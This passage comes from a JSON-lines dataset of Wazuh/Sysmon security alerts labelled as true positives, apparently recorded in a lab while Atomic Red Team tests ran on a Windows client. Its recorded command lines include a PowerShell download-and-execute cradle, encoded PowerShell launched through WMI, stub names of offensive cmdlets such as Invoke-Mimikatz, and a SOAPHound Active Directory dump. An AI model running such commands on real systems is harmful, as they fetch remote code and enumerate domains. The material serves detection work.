"0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 20:24:19.085\r\nProcessGuid: {ff3427f9-3873-6868-bb02-000000001400}\r\nProcessId: 10000\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:24:19.0875185Z", "eventRecordID": "151109", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660660.58317464", "timestamp": "2025-07-04T20:24:20.287+0000"}, "fields": {"timestamp": ["2025-07-04T20:24:20.287Z"]}, "sort": [1751660660287]}}
{"id": "1Bcc15cB1Hp-jZ7f5K3m", "description": "A powershell process created by WMI executed a base64 encoded command", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "1Bcc15cB1Hp-jZ7f5K3m", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-386b-6868-b302-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "C:\\\\WINDOWS\\\\system32\\\\wbem\\\\wmiprvse.exe -secured -Embedding", "processGuid": "{ff3427f9-3889-6868-1503-000000001400}", "logonId": "0xa45f0", "parentProcessId": "4948", "processId": "2632", "currentDirectory": "C:\\\\WINDOWS\\\\system32\\\\", "utcTime": "2025-07-04 20:24:41.929", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe", "ruleName": "technique_id=T1047,technique_name=Windows Management Instrumentation", "company": "Microsoft Corporation", "commandLine": "powershell.exe -NoProfile -EncodedArguments PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQAPAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIAA8AFMAPgA3ADMANQAzADcAMQA0AGUALQA3ADQAYQA3AC0ANABlAGIAMAAtAGIAMQA4AGEALQA5AGUAOAA4ADAAMAAxAGMANABhADcAYwA8AC8AUwA+AA0ACgAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -E VwByAGkAdABlAC0ASABvAHMAdAAgACQAYQByAGcAcwBbADAAXQA=", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "NT AUTHORITY\\\\NETWORK SERVICE"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1047,technique_name=Windows Management Instrumentation\r\nUtcTime: 2025-07-04 20:24:41.929\r\nProcessGuid: {ff3427f9-3889-6868-1503-000000001400}\r\nProcessId: 2632\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe -NoProfile -EncodedArguments PABPAGIAagBzACAAVgBlAHIAcwBpAG8AbgA9ACIAMQAuADEALgAwAC4AMQAiACAAeABtAGwAbgBzAD0AIgBoAHQAdABwADoALwAvAHMAYwBoAGUAbQBhAHMALgBtAGkAYwByAG8AcwBvAGYAdAAuAGMAbwBtAC8AcABvAHcAZQByAHMAaABlAGwAbAAvADIAMAAwADQALwAwADQAIgA+AA0ACgAgACAAPABPAGIAagAgAFIAZQBmAEkAZAA9ACIAMAAiAD4ADQAKACAAIAAgACAAPABUAE4AIABSAGUAZgBJAGQAPQAiADAAIgA+AA0ACgAgACAAIAAgACAAIAA8AFQAPgBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEEAcgByAGEAeQBMAGkAcwB0ADwALwBUAD4ADQAKACAAIAAgACAAIAAgADwAVAA+AFMAeQBzAHQAZQBtAC4ATwBiAGoAZQBjAHQAPAAvAFQAPgANAAoAIAAgACAAIAA8AC8AVABOAD4ADQAKACAAIAAgACAAPABMAFMAVAA+AA0ACgAgACAAIAAgACAAIAA8AFMAPgA3ADMANQAzADcAMQA0AGUALQA3ADQAYQA3AC0ANABlAGIAMAAtAGIAMQA4AGEALQA5AGUAOAA4ADAAMAAxAGMANABhADcAYwA8AC8AUwA+AA0ACgAgACAAIAAgADwALwBMAFMAVAA+AA0ACgAgACAAPAAvAE8AYgBqAD4ADQAKADwALwBPAGIAagBzAD4A -E VwByAGkAdABlAC0ASABvAHMAdAAgACQAYQByAGcAcwBbADAAXQA=\r\nCurrentDirectory: C:\\WINDOWS\\system32\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-386b-6868-b302-000000001400}\r\nParentProcessId: 4948\r\nParentImage: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\r\nParentCommandLine: C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe -secured -Embedding\r\nParentUser: NT AUTHORITY\\NETWORK SERVICE\"", "version": "5", "systemTime": "2025-07-04T20:24:41.9308123Z", "eventRecordID": "151913", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": true, "description": "A powershell process created by WMI executed a base64 encoded command", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Management Instrumentation", "PowerShell"], "id": ["T1047", "T1059.001"], "tactic": ["Execution"]}, "id": "92071"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660683.58813696", "timestamp": "2025-07-04T20:24:43.279+0000"}, "fields": {"timestamp": ["2025-07-04T20:24:43.279Z"]}, "sort": [1751660683279]}}
{"id": "1xcc15cB1Hp-jZ7f5K3m", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "1xcc15cB1Hp-jZ7f5K3m", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-388a-6868-1703-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==", "processGuid": "{ff3427f9-388a-6868-1903-000000001400}", "logonId": "0xa45f0", "parentProcessId": "8636", "processId": "4576", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:24:42.384", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-04 20:24:42.384\r\nProcessGuid: {ff3427f9-388a-6868-1903-000000001400}\r\nProcessId: 4576\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe  -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-388a-6868-1703-000000001400}\r\nParentProcessId: 8636\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:24:42.3862789Z", "eventRecordID": "151938", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660683.58833685", "timestamp": "2025-07-04T20:24:43.677+0000"}, "fields": {"timestamp": ["2025-07-04T20:24:43.677Z"]}, "sort": [1751660683677]}}
{"id": "2Rcc15cB1Hp-jZ7f6K3K", "description": "Powershell.exe spawned a powershell process which executed a base64 encoded command", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "2Rcc15cB1Hp-jZ7f6K3K", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-388b-6868-1a03-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "2424", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:24:43.163", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"powershell.exe\\\" &amp; {$malcmdlets = \\\\\\\"\\\"Add-Persistence\\\\\\\"\\\", \\\\\\\"\\\"Find-AVSignature\\\\\\\"\\\", \\\\\\\"\\\"Get-GPPAutologon\\\\\\\"\\\", \\\\\\\"\\\"Get-GPPPassword\\\\\\\"\\\", \\\\\\\"\\\"Get-HttpStatus\\\\\\\"\\\", \\\\\\\"\\\"Get-Keystrokes\\\\\\\"\\\", \\\\\\\"\\\"Get-SecurityPackages\\\\\\\"\\\", \\\\\\\"\\\"Get-TimedScreenshot\\\\\\\"\\\", \\\\\\\"\\\"Get-VaultCredential\\\\\\\"\\\", \\\\\\\"\\\"Get-VolumeShadowCopy\\\\\\\"\\\", \\\\\\\"\\\"Install-SSP\\\\\\\"\\\", \\\\\\\"\\\"Invoke-CredentialInjection\\\\\\\"\\\", \\\\\\\"\\\"Invoke-DllInjection\\\\\\\"\\\", \\\\\\\"\\\"Invoke-Mimikatz\\\\\\\"\\\", \\\\\\\"\\\"Invoke-NinjaCopy\\\\\\\"\\\", \\\\\\\"\\\"Invoke-Portscan\\\\\\\"\\\", \\\\\\\"\\\"Invoke-ReflectivePEInjection\\\\\\\"\\\", \\\\\\\"\\\"Invoke-ReverseDnsLookup\\\\\\\"\\\", \\\\\\\"\\\"Invoke-Shellcode\\\\\\\"\\\", \\\\\\\"\\\"Invoke-TokenManipulation\\\\\\\"\\\", \\\\\\\"\\\"Invoke-WmiCommand\\\\\\\"\\\", \\\\\\\"\\\"Mount-VolumeShadowCopy\\\\\\\"\\\", \\\\\\\"\\\"New-ElevatedPersistenceOption\\\\\\\"\\\", \\\\\\\"\\\"New-UserPersistenceOption\\\\\\\"\\\", \\\\\\\"\\\"New-VolumeShadowCopy\\\\\\\"\\\", \\\\\\\"\\\"Out-CompressedDll\\\\\\\"\\\", \\\\\\\"\\\"Out-EncodedCommand\\\\\\\"\\\", \\\\\\\"\\\"Out-EncryptedScript\\\\\\\"\\\", \\\\\\\"\\\"Out-Minidump\\\\\\\"\\\", \\\\\\\"\\\"PowerUp\\\\\\\"\\\", \\\\\\\"\\\"PowerView\\\\\\\"\\\", \\\\\\\"\\\"Remove-Comments\\\\\\\"\\\", \\\\\\\"\\\"Remove-VolumeShadowCopy\\\\\\\"\\\", \\\\\\\"\\\"Set-CriticalProcess\\\\\\\"\\\", \\\\\\\"\\\"Set-MasterBootRecord\\\\\\\"\\\"  foreach ($cmdlets in $malcmdlets) {     \\\\\\\"\\\"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\\\\\\\"\\\"} foreach ($cmdlets in $malcmdlets) {     $cmdlets}}", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 20:24:43.163\r\nProcessGuid: {ff3427f9-388b-6868-1a03-000000001400}\r\nProcessId: 2424\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {$malcmdlets = \\\"\"Add-Persistence\\\"\", \\\"\"Find-AVSignature\\\"\", \\\"\"Get-GPPAutologon\\\"\", \\\"\"Get-GPPPassword\\\"\", \\\"\"Get-HttpStatus\\\"\", \\\"\"Get-Keystrokes\\\"\", \\\"\"Get-SecurityPackages\\\"\", \\\"\"Get-TimedScreenshot\\\"\", \\\"\"Get-VaultCredential\\\"\", \\\"\"Get-VolumeShadowCopy\\\"\", \\\"\"Install-SSP\\\"\", \\\"\"Invoke-CredentialInjection\\\"\", \\\"\"Invoke-DllInjection\\\"\", \\\"\"Invoke-Mimikatz\\\"\", \\\"\"Invoke-NinjaCopy\\\"\", \\\"\"Invoke-Portscan\\\"\", \\\"\"Invoke-ReflectivePEInjection\\\"\", \\\"\"Invoke-ReverseDnsLookup\\\"\", \\\"\"Invoke-Shellcode\\\"\", \\\"\"Invoke-TokenManipulation\\\"\", \\\"\"Invoke-WmiCommand\\\"\", \\\"\"Mount-VolumeShadowCopy\\\"\", \\\"\"New-ElevatedPersistenceOption\\\"\", \\\"\"New-UserPersistenceOption\\\"\", \\\"\"New-VolumeShadowCopy\\\"\", \\\"\"Out-CompressedDll\\\"\", \\\"\"Out-EncodedCommand\\\"\", \\\"\"Out-EncryptedScript\\\"\", \\\"\"Out-Minidump\\\"\", \\\"\"PowerUp\\\"\", \\\"\"PowerView\\\"\", \\\"\"Remove-Comments\\\"\", \\\"\"Remove-VolumeShadowCopy\\\"\", \\\"\"Set-CriticalProcess\\\"\", \\\"\"Set-MasterBootRecord\\\"\"\n\nforeach ($cmdlets in $malcmdlets) {\n    \\\"\"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\\\"\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}}\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:24:43.1657533Z", "eventRecordID": "151962", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": true, "description": "Powershell.exe spawned a powershell process which executed a base64 encoded command", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "92057"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660684.58844750", "timestamp": "2025-07-04T20:24:44.154+0000"}, "fields": {"timestamp": ["2025-07-04T20:24:44.154Z"]}, "sort": [1751660684154]}}
{"id": "7Rce15cB1Hp-jZ7fya1f", "description": "Powershell process spawned powershell instance", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "7Rce15cB1Hp-jZ7fya1f", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "PowerShell.EXE", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-2077-6868-5c01-000000001400}", "description": "Windows PowerShell", "logonGuid": "{ff3427f9-1e7f-6868-f045-0a0000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-3905-6868-2503-000000001400}", "logonId": "0xa45f0", "parentProcessId": "9196", "processId": "6692", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-04 20:26:45.317", "hashes": "SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1086,technique_name=PowerShell", "company": "Microsoft Corporation", "commandLine": "\\\"powershell.exe\\\" &amp; {C:\\\\AtomicRedTeam\\\\atomics\\\\T1059.001\\\\bin\\\\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\\\\temp\\\\cache.txt --outputdirectory c:\\\\temp\\\\test2}", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-04 20:26:45.317\r\nProcessGuid: {ff3427f9-3905-6868-2503-000000001400}\r\nProcessId: 6692\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {C:\\AtomicRedTeam\\atomics\\T1059.001\\bin\\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\\temp\\cache.txt --outputdirectory c:\\temp\\test2}\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}\r\nLogonId: 0xA45F0\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T20:26:45.3195301Z", "eventRecordID": "152079", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 24, "mail": false, "description": "Powershell process spawned powershell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "92027"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751660806.58920101", "timestamp": "2025-07-04T20:26:46.620+0000"}, "fields": {"timestamp": ["2025-07-04T20:26:46.620Z"]}, "sort": 